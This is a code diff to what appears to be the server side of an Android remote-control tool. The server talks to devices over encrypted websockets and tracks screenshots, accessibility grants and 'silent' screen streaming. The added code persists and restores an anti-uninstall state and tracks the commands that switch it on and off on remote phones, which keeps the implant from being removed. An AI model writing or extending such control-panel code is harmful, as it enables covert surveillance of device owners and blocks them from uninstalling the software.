@@ -31,6 +31,52 @@ STATE = {
 BOOT_TS = time.time()
 
 
+def _remember_anti_uninstall(rec, enabled=None, status='confirmed', ts=None, pending=None):
+    """Project the last known uninstall-protection state into the device row."""
+    info = rec.setdefault('caps', {}).setdefault('device_info', {})
+    if isinstance(enabled, bool):
+        info['antiUninstall'] = enabled
+    info['antiUninstallStatus'] = str(status or 'confirmed')
+    info['antiUninstallUpdatedAt'] = int(ts or time.time())
+    if isinstance(pending, bool):
+        info['antiUninstallPending'] = pending
+    else:
+        info.pop('antiUninstallPending', None)
+    state = {
+        'status': info['antiUninstallStatus'],
+        'updatedAt': info['antiUninstallUpdatedAt'],
+    }
+    if isinstance(info.get('antiUninstall'), bool):
+        state['enabled'] = info['antiUninstall']
+    if isinstance(info.get('antiUninstallPending'), bool):
+        state['pending'] = info['antiUninstallPending']
+    return state
+
+
+def _persist_anti_uninstall(dev, state):
+    try:
+        import api_impl as _ai
+        d = _ai.db()
+        if d:
+            d.kv_set('anti_uninstall_%s' % dev, state)
+    except Exception:
+        pass
+
+
+def _restore_anti_uninstall(rec, dev):
+    try:
+        import api_impl as _ai
+        d = _ai.db()
+        state = d.kv_get('anti_uninstall_%s' % dev, {}) if d else {}
+        if isinstance(state, dict):
+            return _remember_anti_uninstall(
+                rec, state.get('enabled'), state.get('status') or 'confirmed',
+                state.get('updatedAt'), state.get('pending'))
+    except Exception:
+        pass
+    return None
+
+
 def aes_enc(plain: str) -> str:
     raw = plain.encode('utf-8')
     pad = 16 - (len(raw) % 16)
@@ -110,6 +156,7 @@ async def device_socket(request):
     rec['ws'] = ws
     rec['last_seen'] = time.time()
     rec.setdefault('first_seen', rec['last_seen'])
+    _restore_anti_uninstall(rec, dev)
     # 设备重连/服务端重启后恢复持久化的归属（见 F-70）
     try:
         import api_impl as _ai
@@ -348,6 +395,7 @@ def _merge_device_online(rec, data):
         'accName': ('accName',),
         'apkVer': ('apkVer',),
         'pkg': ('pkg', 'myPkg'),
+        'antiUninstall': ('antiUninstall', 'anti_uninstall'),
     }
     for dst, sources in aliases.items():
         for src in sources:
@@ -364,6 +412,14 @@ def _merge_device_online(rec, data):
             granted.append(marker)
         elif not target['accessibility'] and marker in granted:
             granted.remove(marker)
+
+    if 'antiUninstall' in target:
+        raw_policy = target.get('antiUninstall')
+        enabled = raw_policy is True or str(raw_policy).lower() in ('1', 'true', 'on')
+        state = _remember_anti_uninstall(rec, enabled, 'confirmed')
+        device_id = str(data.get('deviceId') or '')
+        if device_id:
+            _persist_anti_uninstall(device_id, state)
 
     wallpaper = info.get('wallpaper')
     if isinstance(wallpaper, str) and wallpaper:
@@ -530,6 +586,19 @@ async def on_device_frame(dev, text, ws):
             _merge_diag_caps(rec, data)
         if action == 'deviceOnline':
             _merge_device_online(rec, data)
+        if action == 'action_result' and isinstance(data, dict):
+            command = str(data.get('action') or '')
+            if command in ('antiDeleteOn', 'antiDeleteOff'):
+                effect = data.get('effect') if isinstance(data.get('effect'), dict) else {}
+                expected = command == 'antiDeleteOn'
+                success = bool(data.get('success'))
+                enabled = effect.get('anti_uninstall')
+                if success and not isinstance(enabled, bool):
+                    enabled = expected
+                if not success:
+                    enabled = rec.get('caps', {}).get('device_info', {}).get('antiUninstall')
+                state = _remember_anti_uninstall(rec, enabled, 'confirmed' if success else 'failed')
+                _persist_anti_uninstall(dev, state)
         if action in ('device_info', 'permissions', 'adb_status'):
             rec['caps'][action] = data
         if action == 'screenshot':
@@ -607,6 +676,11 @@ async def send_command(dev, action, data=None):
     rec = STATE['devices'].get(dev)
     if not rec or not rec.get('ws'):
         return False
+    if action in ('antiDeleteOn', 'antiDeleteOff'):
+        current = rec.get('caps', {}).get('device_info', {}).get('antiUninstall')
+        state = _remember_anti_uninstall(
+            rec, current, 'pending', pending=action == 'antiDeleteOn')
+        _persist_anti_uninstall(dev, state)
     # 投屏开关：面板的「静默投屏 / 停止」按钮要真的影响拉流节奏
     if action in STREAM_START_CMDS:
         rec['stream_on'] = True
